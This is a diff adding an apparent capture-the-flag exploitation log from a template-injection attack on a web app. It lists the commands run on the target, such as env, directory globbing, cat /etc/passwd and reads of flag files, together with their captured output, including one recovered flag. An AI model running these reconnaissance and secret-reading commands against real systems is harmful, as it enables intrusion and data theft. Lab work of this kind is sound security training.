@@ -1,0 +1,38 @@
+
+########## ENV: env  (captures=0)
+(no capture)
+
+########## GLOB1: echo /*  (captures=2)
+GLOB1
+/app /bin /boot /dev /etc /flag.txt /home /lib /lib64 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var
+
+
+########## GLOB2: echo /app/* /root/* /tmp/*  (captures=2)
+GLOB2
+/app/Dockerfile /app/__pycache__ /app/app.py /app/requirements.txt /app/templates /app/utils /root/* /tmp/changetrack_users.json
+
+
+########## PWD: pwd  (captures=2)
+PWD
+/app
+
+
+########## PASSWD: cat /etc/passwd  (captures=0)
+(no capture)
+
+########## FLAG1: cat /flag.txt  (captures=2)
+FLAG1
+NFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}
+
+
+########## FLAG2: cat /app/flag.txt  (captures=2)
+FLAG2
+
+
+########## FLAG3: cat /app/flag  (captures=2)
+FLAG3
+
+
+########## FLAG4: cat /root/flag.txt  (captures=2)
+FLAG4
+
